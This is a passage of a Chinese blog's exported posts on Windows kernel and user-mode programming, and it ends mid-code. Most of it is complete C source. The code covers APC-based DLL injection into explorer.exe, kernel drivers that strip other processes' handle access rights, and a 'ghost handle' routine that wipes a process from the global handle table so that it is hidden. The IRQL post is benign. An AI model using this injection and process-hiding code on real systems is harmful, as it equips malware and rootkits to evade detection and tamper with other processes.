KAPC_ENVIRONMENT; typedef VOID(*PKNORMAL_ROUTINE) ( IN PVOID NormalContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2 ); typedef VOID(*PKKERNEL_ROUTINE) ( IN struct _KAPC* Apc, IN OUT PKNORMAL_ROUTINE* NormalRoutine, IN OUT PVOID* NormalContext, IN OUT PVOID* SystemArgument1, IN OUT PVOID* SystemArgument2 ); typedef VOID(*PKRUNDOWN_ROUTINE) ( IN struct _KAPC* Apc ); VOID KeInitializeApc( __out PRKAPC Apc, __in PRKTHREAD Thread, __in KAPC_ENVIRONMENT Environment, __in PKKERNEL_ROUTINE KernelRoutine, __in_opt PKRUNDOWN_ROUTINE RundownRoutine, __in_opt PKNORMAL_ROUTINE NormalRoutine, __in_opt KPROCESSOR_MODE ApcMode, __in_opt PVOID NormalContext ); BOOLEAN KeInsertQueueApc( __inout PRKAPC Apc, __in_opt PVOID SystemArgument1, __in_opt PVOID SystemArgument2, __in KPRIORITY Increment ); 具体实现： #include &lt;ntifs.h> #include \"header.h\" VOID NormalRoutineFunc(IN PVOID NormalContext,IN PVOID SystemArgument1,IN PVOID SystemArgument2) { DbgPrintEx(77, 0, \"[+]:NormalRoutineFunc pid: %d\\tIRQL: %d!\\r\\n\", PsGetCurrentProcessId(), KeGetCurrentIrql()); KeSetEvent(SystemArgument1, 0, FALSE); } VOID kernelRoutineFunc(IN struct _KAPC* Apc,IN OUT PKNORMAL_ROUTINE* NormalRoutine,IN OUT PVOID* NormalContext,IN OUT PVOID* SystemArgument1,IN OUT PVOID* SystemArgument2) { DbgPrintEx(77, 0, \"[+]:kernelRoutineFunc pid: %d\\tIRQL: %d!\\r\\n\", PsGetCurrentProcessId(), KeGetCurrentIrql()); ExFreePool(Apc); } VOID DriverUnload(PDRIVER_OBJECT pDriver) { } NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg) { PKAPC pApc = ExAllocatePool(NonPagedPool, sizeof(KAPC)); memset(pApc, 0, sizeof(KAPC)); PKEVENT pEvent = ExAllocatePool(NonPagedPool, sizeof(KEVENT)); memset(pEvent, 0, sizeof(KEVENT)); KeInitializeEvent(pEvent, SynchronizationEvent, FALSE); PETHREAD eThread = NULL; PsLookupThreadByThreadId(1292, &amp;eThread); DbgPrintEx(77, 0, \"[+]:MyProcessId :%d\\tIRQL: %d!\\r\\n\", PsGetCurrentProcessId(), KeGetCurrentIrql()); KeInitializeApc(pApc, eThread, OriginalApcEnvironment, kernelRoutineFunc, NULL, NormalRoutineFunc, KernelMode, (PVOID)1); BOOLEAN is = KeInsertQueueApc(pApc, pEvent, NULL, 0); DbgPrintEx(77, 0, \"[+]:Driver APC Queued!\\r\\n\"); if (!is) { ExFreePool(pApc); ExFreePool(pEvent); } else { KeWaitForSingleObject(pEvent, Executive, KernelMode, FALSE, NULL); DbgPrintEx(77, 0, \"[+]:APC Executed!\\r\\n\"); ExFreePool(pEvent); } pDriver->DriverUnload = DriverUnload; return STATUS_SUCCESS; } 内核插入APC效果如下:","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}]},{"title":"IRQL、分页与非分页内存","slug":"IRQL-NONE-PAGE","date":"2021-08-09T15:46:35.000Z","updated":"2021-10-25T08:10:22.247Z","comments":true,"path":"2021/08/09/IRQL-NONE-PAGE/","link":"","permalink":"http://example.com/2021/08/09/IRQL-NONE-PAGE/","excerpt":"","text":"IRQL：中断请求级别由CPU提供的概念，并且规定，高IRQL的代码，可以抢占（中断）低IRQL的代码的执行过程，从而获得执行机会。 驱动常见的IRQL即其数值如下： IRQL 数值 描述 PASSIVE_LEVEL 0 应用层线程以及大部分内核函数处于该IRQL，可以无限制的使用所有内核API，可以访问分页及非分页内存 APC_LEVEL 1 异步方法调用（APC） 或 页错误时处于该IRQL。 可以使用大部分内核API，可以访问分页及非分页内存 DISPATCH_LEVEL 2 延迟方法调用（DPC）时处于该IRQL。 可以使用特定的内核API，只能访问非分页内存 上表只列出了软件驱动所会使用到的IRQL，并不代表IRQL只有这三个值。不同体系CPU对于IRQL的分级大同小异。 分页和非分页内存在CPU保护模式分页机制开启的情况下，驱动所面对的地址全部都是虚拟地址（线性地址），需要通过页表转换得到实际的物理地址。这个地址的转换过程由CPU完成。 虚拟地址与物理地址的实际关系是多对一的关系，不同的虚拟地址可以对应着同一个物理地址，当这个情况发生的时候，这个物理地址所存的内容会被操作系统置换到磁盘上。 所以在WINDOWS操作系统定义的时候，就定义了两种内存类型：分页内存与非分页内存。 分页内存指的是这些内存可以被置换到磁盘上。 非分页内存指的是这些内存不可以被置换到磁盘上。 获取当前IRQL方法使用调用函数KeGetCurrentIrql即可获得当前的IRQL 示例代码 #include &lt;ntifs.h> VOID DrivUnload(PDRIVER_OBJECT DriverObject) { KdPrintEx((77, 0, \"[+]: Driver Unloaded!!!\\r\\n\")); } NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg) { KIRQL IRQL = KeGetCurrentIrql(); pDriver->DriverUnload = DrivUnload; KdPrintEx((77, 0, \"[+]: Driver Loaded!!! Current IRQL:%d\\r\\n\", IRQL)); return STATUS_SUCCESS; }","categories":[],"tags":[{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"},{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"R3 ACP注入","slug":"R3-apc","date":"2021-08-07T03:09:34.000Z","updated":"2021-10-25T08:18:17.044Z","comments":true,"path":"2021/08/07/R3-apc/","link":"","permalink":"http://example.com/2021/08/07/R3-apc/","excerpt":"","text":"注入代码如下： #include \"stdafx.h\" #include \"ApcInject.h\" void ShowError(char *pszText) { char szErr[MAX_PATH] = { 0 }; ::wsprintf(szErr, \"%s Error[%d]\\n\", pszText); ::MessageBox(NULL, szErr, \"ERROR\", MB_OK | MB_ICONERROR); } // 根据进程名称获取PID DWORD GetProcessIdByProcessName(char *pszProcessName) { DWORD dwProcessId = 0; PROCESSENTRY32 pe32 = { 0 }; HANDLE hSnapshot = NULL; BOOL bRet = FALSE; ::RtlZeroMemory(&amp;pe32, sizeof(pe32)); pe32.dwSize = sizeof(pe32); // 获取进程快照 hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (NULL == hSnapshot) { ShowError(\"CreateToolhelp32Snapshot\"); return dwProcessId; } // 获取第一条进程快照信息 bRet = ::Process32First(hSnapshot, &amp;pe32); while (bRet) { // 获取快照信息 if (0 == ::lstrcmpi(pe32.szExeFile, pszProcessName)) { dwProcessId = pe32.th32ProcessID; break; } // 遍历下一个进程快照信息 bRet = ::Process32Next(hSnapshot, &amp;pe32); } return dwProcessId; } // 根据PID获取所有的相应线程ID BOOL GetAllThreadIdByProcessId(DWORD dwProcessId, DWORD **ppThreadId, DWORD *pdwThreadIdLength) { DWORD *pThreadId = NULL; DWORD dwThreadIdLength = 0; DWORD dwBufferLength = 1000; THREADENTRY32 te32 = { 0 }; HANDLE hSnapshot = NULL; BOOL bRet = TRUE; do { // 申请内存 pThreadId = new DWORD[dwBufferLength]; if (NULL == pThreadId) { ShowError(\"new\"); bRet = FALSE; break; } ::RtlZeroMemory(pThreadId, (dwBufferLength * sizeof(DWORD))); // 获取线程快照 ::RtlZeroMemory(&amp;te32, sizeof(te32)); te32.dwSize = sizeof(te32); hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); if (NULL == hSnapshot) { ShowError(\"CreateToolhelp32Snapshot\"); bRet = FALSE; break; } // 获取第一条线程快照信息 bRet = ::Thread32First(hSnapshot, &amp;te32); while (bRet) { // 获取进程对应的线程ID if (te32.th32OwnerProcessID == dwProcessId) { pThreadId[dwThreadIdLength] = te32.th32ThreadID; dwThreadIdLength++; } // 遍历下一个线程快照信息 bRet = ::Thread32Next(hSnapshot, &amp;te32); } // 返回 *ppThreadId = pThreadId; *pdwThreadIdLength = dwThreadIdLength; bRet = TRUE; } while (FALSE); if (FALSE == bRet) { if (pThreadId) { delete[]pThreadId; pThreadId = NULL; } } return bRet; } // APC注入 BOOL ApcInjectDll(char *pszProcessName, char *pszDllName) { BOOL bRet = FALSE; DWORD dwProcessId = 0; DWORD *pThreadId = NULL; DWORD dwThreadIdLength = 0; HANDLE hProcess = NULL, hThread = NULL; PVOID pBaseAddress = NULL; PVOID pLoadLibraryAFunc = NULL; SIZE_T dwRet = 0, dwDllPathLen = 1 + ::lstrlen(pszDllName); DWORD i = 0; do { // 根据进程名称获取PID dwProcessId = GetProcessIdByProcessName(pszProcessName); if (0 >= dwProcessId) { bRet = FALSE; break; } // 根据PID获取所有的相应线程ID bRet = GetAllThreadIdByProcessId(dwProcessId, &amp;pThreadId, &amp;dwThreadIdLength); if (FALSE == bRet) { bRet = FALSE; break; } // 打开注入进程 hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (NULL == hProcess) { ShowError(\"OpenProcess\"); bRet = FALSE; break; } // 在注入进程空间申请内存 pBaseAddress = ::VirtualAllocEx(hProcess, NULL, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (NULL == pBaseAddress) { ShowError(\"VirtualAllocEx\"); bRet = FALSE; break; } // 向申请的空间中写入DLL路径数据 ::WriteProcessMemory(hProcess, pBaseAddress, pszDllName, dwDllPathLen, &amp;dwRet); if (dwRet != dwDllPathLen) { ShowError(\"WriteProcessMemory\"); bRet = FALSE; break; } // 获取 LoadLibrary 地址 pLoadLibraryAFunc = ::GetProcAddress(::GetModuleHandle(\"kernel32.dll\"), \"LoadLibraryA\"); if (NULL == pLoadLibraryAFunc) { ShowError(\"GetProcessAddress\"); bRet = FALSE; break; } // 遍历线程, 插入APC for (i = 0; i &lt; dwThreadIdLength; i++) { // 打开线程 hThread = ::OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadId[i]); if (hThread) { // 插入APC ::QueueUserAPC((PAPCFUNC)pLoadLibraryAFunc, hThread, (ULONG_PTR)pBaseAddress); // 关闭线程句柄 ::CloseHandle(hThread); hThread = NULL; } } bRet = TRUE; } while (FALSE); // 释放内存 if (hProcess) { ::CloseHandle(hProcess); hProcess = NULL; } if (pThreadId) { delete[]pThreadId; pThreadId = NULL; } return bRet; } 向explorer.exe注入，并编写测试DLL代码： #include \"stdafx.h\" #include &lt;Windows.h> BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { STARTUPINFO si = { 0 }; PROCESS_INFORMATION pi = { 0 }; si.cb = sizeof(PROCESS_INFORMATION); switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: { CreateProcessA(\"cmd.exe\", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi); break; } case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 效果如下：","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"功能","slug":"功能","permalink":"http://example.com/tags/%E5%8A%9F%E8%83%BD/"}]},{"title":"句柄降权","slug":"handleDisable","date":"2021-08-07T03:07:19.000Z","updated":"2021-10-25T08:11:30.439Z","comments":true,"path":"2021/08/07/handleDisable/","link":"","permalink":"http://example.com/2021/08/07/handleDisable/","excerpt":"","text":"定义头文件 #pragma once #include &lt;ntifs.h> #include &lt;ntimage.h> typedef struct _FindCode { UCHAR code[0x200]; ULONG len; int offset; ULONG lastAddressOffset; }FindCode, * PFindCode; typedef enum _SYSTEM_INFORMATION_CLASS { SystemBasicInformation, SystemProcessorInformation, SystemPerformanceInformation, SystemTimeOfDayInformation, SystemPathInformation, SystemProcessInformation, SystemCallCountInformation, SystemDeviceInformation, SystemProcessorPerformanceInformation, SystemFlagsInformation, SystemCallTimeInformation, SystemModuleInformation, SystemLocksInformation, SystemStackTraceInformation, SystemPagedPoolInformation, SystemNonPagedPoolInformation, SystemHandleInformation, SystemObjectInformation, SystemPageFileInformation, SystemVdmInstemulInformation, SystemVdmBopInformation, SystemFileCacheInformation, SystemPoolTagInformation, SystemInterruptInformation, SystemDpcBehaviorInformation, SystemFullMemoryInformation, SystemLoadGdiDriverInformation, SystemUnloadGdiDriverInformation, SystemTimeAdjustmentInformation, SystemSummaryMemoryInformation, SystemMirrorMemoryInformation, SystemPerformanceTraceInformation, SystemObsolete0, SystemExceptionInformation, SystemCrashDumpStateInformation, SystemKernelDebuggerInformation, SystemContextSwitchInformation, SystemRegistryQuotaInformation, SystemExtendServiceTableInformation, SystemPrioritySeperation, SystemVerifierAddDriverInformation, SystemVerifierRemoveDriverInformation, SystemProcessorIdleInformation, SystemLegacyDriverInformation, SystemCurrentTimeZoneInformation, SystemLookasideInformation, SystemTimeSlipNotification, SystemSessionCreate, SystemSessionDetach, SystemSessionInformation, SystemRangeStartInformation, SystemVerifierInformation, SystemVerifierThunkExtend, SystemSessionProcessInformation, SystemLoadGdiDriverInSystemSpace, SystemNumaProcessorMap, SystemPrefetcherInformation, SystemExtendedProcessInformation, SystemRecommendedSharedDataAlignment, SystemComPlusPackage, SystemNumaAvailableMemory, SystemProcessorPowerInformation, SystemEmulationBasicInformation, SystemEmulationProcessorInformation, SystemExtendedHandleInformation, SystemLostDelayedWriteInformation, SystemBigPoolInformation, SystemSessionPoolTagInformation, SystemSessionMappedViewInformation, SystemHotpatchInformation, SystemObjectSecurityMode, SystemWatchdogTimerHandler, SystemWatchdogTimerInformation, SystemLogicalProcessorInformation, SystemWow64SharedInformation, SystemRegisterFirmwareTableInformationHandler, SystemFirmwareTableInformation, SystemModuleInformationEx, SystemVerifierTriageInformation, SystemSuperfetchInformation, SystemMemoryListInformation, SystemFileCacheInformationEx, MaxSystemInfoClass // MaxSystemInfoClass should always be the last enum } SYSTEM_INFORMATION_CLASS; typedef struct _RTL_PROCESS_MODULE_INFORMATION { HANDLE Section; // Not filled in PVOID MappedBase; PVOID ImageBase; ULONG ImageSize; ULONG Flags; USHORT LoadOrderIndex; USHORT InitOrderIndex; USHORT LoadCount; USHORT OffsetToFileName; UCHAR FullPathName[256]; } RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION; typedef struct _RTL_PROCESS_MODULES { ULONG NumberOfModules; RTL_PROCESS_MODULE_INFORMATION Modules[1]; } RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES; NTSTATUS NTAPI ZwQuerySystemInformation( __in SYSTEM_INFORMATION_CLASS SystemInformationClass, __out_bcount_opt(SystemInformationLength) PVOID SystemInformation, __in ULONG SystemInformationLength, __out_opt PULONG ReturnLength ); static ObTypeIndexTable = NULL; static ProtectPid = NULL; HANDLE hThread = NULL; BOOLEAN isThreadWork = TRUE; 实现如下： #pragma once #include &lt;ntifs.h> #include \"header.h\" UCHAR charToHex(UCHAR* ch) { unsigned char temps[2] = { 0 }; for (int i = 0; i &lt; 2; i++) { if (ch[i] >= '0' &amp;&amp; ch[i] &lt;= '9') { temps[i] = (ch[i] - '0'); } else if (ch[i] >= 'A' &amp;&amp; ch[i] &lt;= 'F') { temps[i] = (ch[i] - 'A') + 0xA; } else if (ch[i] >= 'a' &amp;&amp; ch[i] &lt;= 'f') { temps[i] = (ch[i] - 'a') + 0xA; } } return ((temps[0] &lt;&lt; 4) &amp; 0xf0) | (temps[1] &amp; 0xf); } void initFindCodeStruct(PFindCode findCode, PCHAR code, ULONG_PTR offset, ULONG_PTR lastAddrOffset) { memset(findCode, 0, sizeof(FindCode)); findCode->lastAddressOffset = lastAddrOffset; findCode->offset = offset; PCHAR pTemp = code; ULONG_PTR i = 0; for (i = 0; *pTemp != '\\0'; i++) { if (*pTemp == '*' || *pTemp == '?') { findCode->code[i] = *pTemp; pTemp++; continue; } findCode->code[i] = charToHex(pTemp); pTemp += 2; } findCode->len = i; } ULONG_PTR findAddressByCode(ULONG_PTR beginAddr, ULONG_PTR endAddr, PFindCode findCode, ULONG numbers) { ULONG64 j = 0; LARGE_INTEGER rtna = { 0 }; for (ULONG_PTR i = beginAddr; i &lt;= endAddr; i++) { if (!MmIsAddressValid((PVOID)i)) { i = i &amp; (~0xfff) + PAGE_SIZE - 1; continue; } for (j = 0; j &lt; numbers; j++) { FindCode fc = findCode[j]; ULONG_PTR tempAddress = i; UCHAR* code = (UCHAR*)(tempAddress + fc.offset); BOOLEAN isFlags = FALSE; for (ULONG_PTR k = 0; k &lt; fc.len; k++) { if (!MmIsAddressValid((PVOID)(code + k))) { isFlags = TRUE; break; } if (fc.code[k] == '*' || fc.code[k] == '?') continue; if (code[k] != fc.code[k]) { isFlags = TRUE; break; } } if (isFlags) break; } if (j == numbers) { rtna.QuadPart = i; rtna.LowPart += findCode[0].lastAddressOffset; break; } } return rtna.QuadPart; } char* CharToUper(char* wstr, BOOLEAN isAllocateMemory) { char* ret = NULL; if (isAllocateMemory) { int len = strlen(wstr) + 2; ret = ExAllocatePool(PagedPool, len); memset(ret, 0, len); memcpy(ret, wstr, len - 2); } else { ret = wstr; } _strupr(ret); return ret; } ULONG_PTR QuerySysModule(char* MoudleName, _Out_opt_ ULONG_PTR* module) { RTL_PROCESS_MODULES info; ULONG retPro = NULL; ULONG_PTR moduleSize = 0; NTSTATUS ststas = ZwQuerySystemInformation(SystemModuleInformation, &amp;info, sizeof(info), &amp;retPro); char* moduleUper = CharToUper(MoudleName, TRUE); if (ststas == STATUS_INFO_LENGTH_MISMATCH) { ULONG len = retPro + sizeof(RTL_PROCESS_MODULES); PRTL_PROCESS_MODULES mem = (PRTL_PROCESS_MODULES)ExAllocatePool(PagedPool, len); memset(mem, 0, len); ststas = ZwQuerySystemInformation(SystemModuleInformation, mem, len, &amp;retPro); if (!NT_SUCCESS(ststas)) { ExFreePool(moduleUper); ExFreePool(mem); return 0; } if (strstr(MoudleName, \"ntkrnlpa.exe\") || strstr(MoudleName, \"ntoskrnl.exe\")) { PRTL_PROCESS_MODULE_INFORMATION ModuleInfo = &amp;(mem->Modules[0]); *module = ModuleInfo->ImageBase; moduleSize = ModuleInfo->ImageSize; } else { for (int i = 0; i &lt; mem->NumberOfModules; i++) { PRTL_PROCESS_MODULE_INFORMATION processModule = &amp;mem->Modules[i]; CharToUper(processModule->FullPathName, FALSE); if (strstr(processModule->FullPathName, moduleUper)) { if (module) { *module = processModule->ImageBase; } moduleSize = processModule->ImageSize; break; } } } ExFreePool(mem); } ExFreePool(moduleUper); return moduleSize; } ULONG searchNtCode(char* code, int offset) { FindCode fs[1] = { 0 }; initFindCodeStruct(&amp;fs[0], code, 0, offset); SIZE_T moduleBase = 0; ULONG size = QuerySysModule(\"ntkrnlpa.exe\", &amp;moduleBase); ULONG_PTR func = findAddressByCode(moduleBase, size + moduleBase, fs, 1); return func; } PUNICODE_STRING GetTypeNameByTypeIndex(ULONG TypeIndex) { if (!ObTypeIndexTable) { PCH Partten = (PCH)searchNtCode(\"8BFF558BEC83**0FB6**538B******8A46*57895D*8975*A8\", 0xd); ObTypeIndexTable = *(PULONG)(Partten + 3); //KdPrintEx((77, 0, \"[+] ObTypeIndexTable : %x\\r\\n\", ObTypeIndexTable)); } PCH ObjectType = (PCH)ObTypeIndexTable + 4 * TypeIndex; //KdPrintEx((77, 0, \"[+] ObjectType : %x\\r\\n\", ObjectType)); PUNICODE_STRING TypeName = *(PULONG)ObjectType + 0x8; //KdPrintEx((77, 0, \"[+] TypeName : %wZ\\r\\n\", TypeName)); return TypeName; } VOID PrivHandleProtect(PVOID ObjectTable,PVOID EPROCESS) { ULONG HandleObjectAddress = NULL; ULONG ObjectHeader = NULL; //KdPrintEx((77, 0, \"[+] ObjectTable : %x\\r\\n\", ObjectTable)); for (int j = 0; j &lt; 512; j++) { HandleObjectAddress = *(PULONG)((PCH)ObjectTable + 8 * j); if (!HandleObjectAddress)continue; //KdPrintEx((77, 0, \"[+] HandleObjectAddress : %x\\r\\n\", HandleObjectAddress)); ObjectHeader = (HandleObjectAddress &amp; ~7); PCH ObjectTypeIndex = (PCH)ObjectHeader + 0xC; ULONG TypeIndex = (ULONG)*ObjectTypeIndex; if (TypeIndex == 7) { if ((PCH)EPROCESS - 0x18 == ObjectHeader) { ULONG AccessFlag = *(PULONG)((PCH)ObjectTable + 8 * j + 4); KdPrintEx((77, 0, \"[+] Found one AccessFlag = 0x%x\\r\\n\",AccessFlag)); AccessFlag = AccessFlag &amp; ~0x31; *(PULONG)((PCH)ObjectTable + 8 * j + 4) = AccessFlag; } //KdPrintEx((77, 0, \"[+] HandleObjectAddress : %x\\r\\n\", HandleObjectAddress)); PUNICODE_STRING TypeName = GetTypeNameByTypeIndex(TypeIndex); PUNICODE_STRING ProcImage = *(PULONG)((PCH)ObjectHeader + 0x18 + 0x1ec); //KdPrintEx((77, 0, \"[+] ObjectHeader : %x \\t TypeName: %wZ \\t ProcImage: %wZ\\r\\n\", ObjectHeader, TypeName, ProcImage)); } } } VOID ProtectHandle() { ULONG PID = ProtectPid; PEPROCESS ProtectProc = NULL; PEPROCESS Process = NULL; LARGE_INTEGER large = { 0 }; large.QuadPart = -10000 * 5000; //1ske while (isThreadWork) { KdPrintEx((77, 0, \"[+] Start Protect Pid = %d\\r\\n\", PID)); NTSTATUS ProtectProcStatus = PsLookupProcessByProcessId((HANDLE)PID, &amp;ProtectProc); if (!NT_SUCCESS(ProtectProcStatus))break; for (int i = 8; i &lt; 0x1000000; i += 4) { //if (i != 3980)continue; NTSTATUS status = PsLookupProcessByProcessId((HANDLE)i, &amp;Process); if (!NT_SUCCESS(status))continue; ULONG ObjectTable = *(PULONG) * (PULONG)((PCH)Process + 0xf4); //Process.ObjectTable //KdPrintEx((77, 0, \"[+] Process : %x \\tObjectTable : %x\\r\\n\", Process, ObjectTable)); switch (ObjectTable &amp; 3) { case 0: PrivHandleProtect(ObjectTable, ProtectProc); break; case 1: ObjectTable -= 1; for (int j = 0; j &lt; 512; j++) { ULONG tempObjectTable = *(PULONG)((PCH)ObjectTable + 4 * j); if (!tempObjectTable) break; PrivHandleProtect(tempObjectTable, ProtectProc); } break; default: break; } ObDereferenceObject(Process); } ObDereferenceObject(ProtectProc); KeDelayExecutionThread(KernelMode, TRUE, &amp;large); } } VOID DrivUnload(PDRIVER_OBJECT DriverObject) { isThreadWork = FALSE; LARGE_INTEGER large = { 0 }; large.QuadPart = -10000 * 10000; //1ske KeDelayExecutionThread(KernelMode, TRUE, &amp;large); KdPrintEx((77, 0, \"[-]---------------------------[-]\\r\\n\")); } NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg) { //DbgBreakPoint(); KdPrintEx((77, 0, \"[+]---------------------------[+]\\r\\n\")); ProtectPid = 2304; PsCreateSystemThread(&amp;hThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, ProtectHandle,NULL); pDriver->DriverUnload = DrivUnload; return STATUS_SUCCESS; } 保护前： 保护后效果如下：","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}]},{"title":"幽灵句柄","slug":"ghostHandle","date":"2021-08-02T17:50:57.000Z","updated":"2021-10-25T08:11:45.272Z","comments":true,"path":"2021/08/03/ghostHandle/","link":"","permalink":"http://example.com/2021/08/03/ghostHandle/","excerpt":"","text":"#include &lt;ntifs.h> //0x28 bytes (sizeof) typedef struct _DBGKD_GET_VERSION64 { USHORT MajorVersion; //0x0 USHORT MinorVersion; //0x2 UCHAR ProtocolVersion; //0x4 UCHAR KdSecondaryVersion; //0x5 USHORT Flags; //0x6 USHORT MachineType; //0x8 UCHAR MaxPacketType; //0xa UCHAR MaxStateChange; //0xb UCHAR MaxManipulate; //0xc UCHAR Simulation; //0xd USHORT Unused[1]; //0xe ULONGLONG KernBase; //0x10 ULONGLONG PsLoadedModuleList; //0x18 ULONGLONG DebuggerDataList; //0x20 } DBGKD_GET_VERSION, * PDBGKD_GET_VERSION; ULONG GetDataListAddr() { ULONG procNum = NULL; KeSetSystemAffinityThread(1); procNum = KeGetCurrentProcessorNumber(); KdPrintEx((77, 0, \"Current Processor is No.%x\\r\\n\", procNum)); if (procNum) return 0; PKPCR kpcr; kpcr = __readfsdword(0x1C); //_KPCR.SelfPcr PDBGKD_GET_VERSION dbgVer = (PDBGKD_GET_VERSION)kpcr->KdVersionBlock; LONGLONG pDataList = (LONGLONG)dbgVer->DebuggerDataList; ULONG address = *(PULONG)pDataList; KeRevertToUserAffinityThread(); return address; } VOID RemoveHandleOfProc(ULONG TargetAddr) { KdPrintEx((77, 0, \"[+]: Handle Addr is %x\\r\\n\", TargetAddr)); *(PULONG)((PCH)(*(PLONGLONG)TargetAddr &amp; 0xFFFFFFFE) + 0xb4) = 0; *(LONGLONG*)(TargetAddr) = 0; } NTSTATUS AnalysisGlobalTable(ULONG TableAddress,PWCH name) { KdPrintEx((77, 0, \"[+]: Analysis Table Addr %x\\r\\n\", TableAddress)); WCHAR tmpProcName[500] = { 0 }; for (int i = 0; i &lt; 512; i++) { LONGLONG ObjectAddr = *(LONGLONG*)(TableAddress + 8 * i); PEPROCESS pEprocess = ObjectAddr &amp; 0xFFFFFFFE; if (pEprocess == NULL)continue; ULONG ObjectHeaderAddr = (PCH)pEprocess - 0x18; CHAR TypeIndex = *(PCH)(ObjectHeaderAddr + 0xC); if (TypeIndex == 7) { int pid = *(PULONG)((PCH)pEprocess + 0xb4); PUNICODE_STRING pName = *(PULONG)((PCH)pEprocess + 0x1ec); if (pName->Length) { KdPrintEx((77, 0, \"[+]: pid %04d\\tEPROCESS %x\\tTypeIndex %d\\t|| FilePath %wZ\\r\\n\", pid, pEprocess, TypeIndex, pName)); wcscpy(tmpProcName, pName->Buffer); _wcsupr(tmpProcName); if (wcsstr(tmpProcName, name) != 0) { KdPrintEx((77, 0, \"[+]:%S is found at addr %x!!!\\r\\n\", tmpProcName, pEprocess)); RemoveHandleOfProc(TableAddress + 8 * i); //break; } } } } return STATUS_SUCCESS; } VOID DrivUnload(PDRIVER_OBJECT DriverObject) { KdPrint((\"[+]: Driver Unloaded!!!\\r\\n\")); } NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg) { //DbgBreakPoint(); PWCH TargetName = (PWCH)L\"DBGVIEW.EXE\"; ULONG DataListAddr = GetDataListAddr(); KdPrintEx((77, 0, \"[+]: DataListAddr is %x\\r\\n\", DataListAddr)); ULONG PspCidTable = *(PULONG)(DataListAddr + 0x58); ULONG TableValue = *(PULONG)(*(PULONG)PspCidTable); KdPrintEx((77, 0, \"[+]: TableValue is %x\\r\\n\", TableValue)); switch (TableValue &amp; 0x3) { case 0: KdPrintEx((77, 0, \"[+]: One Level Table\\r\\n\")); AnalysisGlobalTable(TableValue, TargetName); break; case 1: KdPrintEx((77, 0, \"[+]: Two Level Table\\r\\n\")); TableValue -= 1; for (; *(PULONG)TableValue; TableValue += 4) { AnalysisGlobalTable(*(PULONG)TableValue, TargetName); } break; case 2: KdPrintEx((77, 0, \"[+]: Three Level Table\\r\\n\")); break; default: break; } pDriver->DriverUnload = DrivUnload; KdPrint((\"[+]: Driver Loaded!!!\\r\\n\")); return STATUS_SUCCESS; } 清空了句柄就可以防止他人通过句柄获取到我们保护进程的EPROCESS、同时可以隐藏进程。","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}]},{"title":"解析全局句柄表并获取进程信息","slug":"GlobalHandleTable","date":"2021-08-01T13:57:08.000Z","updated":"2021-10-25T08:11:38.177Z","comments":true,"path":"2021/08/01/GlobalHandleTable/","link":"","permalink":"http://example.com/2021/08/01/GlobalHandleTable/","excerpt":"","text":"#include &lt;ntifs.h> //0x28 bytes (sizeof) typedef struct _DBGKD_GET_VERSION64 { USHORT MajorVersion; //0x0 USHORT MinorVersion; //0x2 UCHAR ProtocolVersion; //0x4 UCHAR KdSecondaryVersion; //0x5 USHORT Flags; //0x6 USHORT MachineType; //0x8 UCHAR MaxPacketType; //0xa UCHAR MaxStateChange; //0xb UCHAR MaxManipulate; //0xc UCHAR Simulation; //0xd USHORT Unused[1]; //0xe ULONGLONG KernBase; //0x10 ULONGLONG PsLoadedModuleList; //0x18 ULONGLONG DebuggerDataList; //0x20 } DBGKD_GET_VERSION, * PDBGKD_GET_VERSION; ULONG GetDataListAddr() { ULONG procNum = NULL; KeSetSystemAffinityThread(1); procNum = KeGetCurrentProcessorNumber(); KdPrintEx((77, 0, \"Current Processor is No.%x\\r\\n\", procNum)); if (procNum) return 0; PKPCR kpcr; kpcr = __readfsdword(0x1C); //_KPCR.SelfPcr PDBGKD_GET_VERSION dbgVer = (PDBGKD_GET_VERSION)kpcr->KdVersionBlock; LONGLONG pDataList = (LONGLONG)dbgVer->DebuggerDataList; ULONG address = *(PULONG)pDataList; KeRevertToUserAffinityThread(); return address; } NTSTATUS AnalysisGlobalTable(ULONG TableAddress) { KdPrintEx((77, 0, \"[+]: Analysis Table Addr %x\\r\\n\", TableAddress)); for (int i = 0; i &lt; 512; i++) { LONGLONG ObjectAddr = *(LONGLONG*)(TableAddress + 8 * i); PEPROCESS pEprocess = ObjectAddr &amp; 0xFFFFFFFE; if (pEprocess == NULL)continue; ULONG ObjectHeaderAddr = (PCH)pEprocess - 0x18; CHAR TypeIndex = 